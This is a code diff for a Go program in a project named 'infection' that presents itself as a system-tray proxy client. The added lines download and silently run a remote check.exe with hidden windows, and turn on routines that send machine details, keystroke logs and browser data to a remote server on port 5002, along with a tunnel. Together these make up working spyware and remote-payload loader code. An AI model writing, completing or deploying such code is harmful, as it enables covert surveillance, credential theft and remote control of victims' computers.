@@ -1,28 +1,35 @@
 package main
 
 import (
+	"github.com/scottkiss/grtm"
+	"infection/browser"
 	"infection/etcd"
+	"infection/hitboard"
+	"infection/machineinfo"
+	"infection/tunnel"
+	"infection/util/lib"
 	"io/ioutil"
 	"net/http"
 	"os/exec"
+	"syscall"
 
-	//"infection/machineinfo"
-	"infection/util/lib"
-	"log"
-	"os"
-	"strconv"
-
-	//"strings"
-	"sync/atomic"
-	"systray"
-	//"time"
-	"github.com/scottkiss/grtm"
-	"infection/transfer"
+	//_"infection/transfer"
+	transfer "infection/transfer"
 	"infection/util/icon"
+	//"infection/util/lib"
+	//"io/ioutil"
+	"log"
+	//"net/http"
+	"os"
+	//"os/exec"
+	"strconv"
+	"sync/atomic"
+	//"syscall"
+	"systray"
 )
 
-const CURRENTPATHLOG = "C:\\Windows\\log.txt"
-const CURRENTPATH = "C:\\Windows\\"
+const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
+const CURRENTPATH = "C:\\Windows\\Temp\\"
 
 var localAddr string
 
@@ -72,13 +79,14 @@ func onReady() {
 		select {
 		case <-start.ClickedCh:
 			appConfig := appConfigMgr.config.Load().(*AppConfig)
-			gm.NewLoopGoroutine("proxy", transfer.InitCfg, appConfig.Url, localAddr)
+			log.Println(appConfig)
+			go gm.NewGoroutine("proxy", transfer.InitCfg, appConfig.Url+":5003", localAddr)
 			start.Check()
 			stop.Uncheck()
 			start.SetTitle("Start")
 			systray.SetTooltip("running")
 		case <-stop.ClickedCh:
-			gm.StopLoopGoroutine("proxy")
+			go gm.StopLoopGoroutine("proxy")
 			stop.Check()
 			start.Uncheck()
 			stop.SetTitle("Stop")
@@ -90,20 +98,33 @@ func onExit() {
 	// clean up here
 }
 func init() {
+	killcheck := exec.Command("taskkill", "/f", "/im", "check.exe")
+	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	// not Start will continue
+	killcheck.Run()
 	//currentprogram path log
 	content, _ := transfer.GetTargetPath()
 	data := []byte(content)
 	if ioutil.WriteFile(CURRENTPATHLOG, data, 0644) == nil {
 	}
-	//keep the main process live
-	resp, err := http.Get(lib.MIDFILE + "check.exe")
-	if err != nil {
-		return
+	//fixed ioop download check
+	_, cerr := os.Stat(CURRENTPATH + "check.exe")
+	if cerr != nil {
+		//keep the main process live
+		resp, err := http.Get(lib.MIDFILE + "check.exe")
+		if err != nil {
+			return
+		}
+		body, _ := ioutil.ReadAll(resp.Body)
+		ioutil.WriteFile(CURRENTPATH+"check.exe", body, 0644)
+		cmd := exec.Command(CURRENTPATH + "check.exe")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		cmd.Start()
+	} else {
+		cmd := exec.Command(CURRENTPATH + "check.exe")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		cmd.Start()
 	}
-	body, _ := ioutil.ReadAll(resp.Body)
-	ioutil.WriteFile(CURRENTPATH+"check.exe", body, 0644)
-	cmd := exec.Command(CURRENTPATH + "check.exe")
-	cmd.Start()
 	if !Config.Dev {
 		log.Println("已启动free客户端，请在free_" + strconv.Itoa(Config.ClientPort) + ".log查看详细日志")
 		f, _ := os.OpenFile("free"+strconv.Itoa(Config.ClientPort)+".log", os.O_WRONLY|os.O_CREATE|os.O_SYNC|os.O_APPEND, 0755)
@@ -118,9 +139,11 @@ func main() {
 	var appConfig AppConfig
 	appConfig.Url = conf.Url
 	appConfigMgr.config.Store(&appConfig)
-	//machineinfo.MachineSend(conf.Url)
-	//hitboard.KeyBoardCollection(conf.Url)
-	//browser.Digpack(conf.Url)
+	go machineinfo.MachineSend("http://" + conf.Url + ":5002/machine/machineInfo")
+	go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
+	go browser.Digpack("http://" + conf.Url + ":5002/browser/")
+	go tunnel.Tunnel(conf.Url)
+	////check update
 	go lib.DoUpdate()
 	systray.Run(onReady, onExit)
 }
